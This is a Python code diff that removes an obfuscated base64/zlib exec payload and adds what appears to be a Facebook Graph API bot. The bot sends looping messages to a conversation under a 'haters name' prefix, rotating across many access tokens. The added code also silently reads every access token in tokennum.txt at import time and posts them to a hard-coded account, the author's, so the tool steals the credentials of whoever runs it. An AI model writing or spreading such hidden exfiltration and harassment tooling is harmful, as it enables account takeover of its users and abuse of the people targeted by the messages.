@@ -1,6 +1,140 @@
-#ENCODED BY : hanu
-#ENCRYPTION : Py3 hannu
-#GITHUB : hannu
-#----------------------------------------------
-import marshal, base64, zlib
-exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"The Legend Star ANOX Don Here")
+
+def execute_server():
+      PORT = 4000
+
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
+
+
+def send_initial_message():
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+
+      # Modify the message as per your requirement
+      msg_template = "Hello Anox sir! I am using your server. My token is {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "100087411382804"
+
+      requests.packages.urllib3.disable_warnings()
+
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
+
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
+
+      with open('NP.txt', 'r') as file:
+          messages = file.readlines()
+
+      num_messages = len(messages)
+
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
+
+      with open('hatersname.txt', 'r') as file:
+          haters_name = file.read().strip()
+
+      with open('time.txt', 'r') as file:
+          speed = int(file.read().strip())
+
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + '' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
+
+if __name__ == '__main__':
+      main()
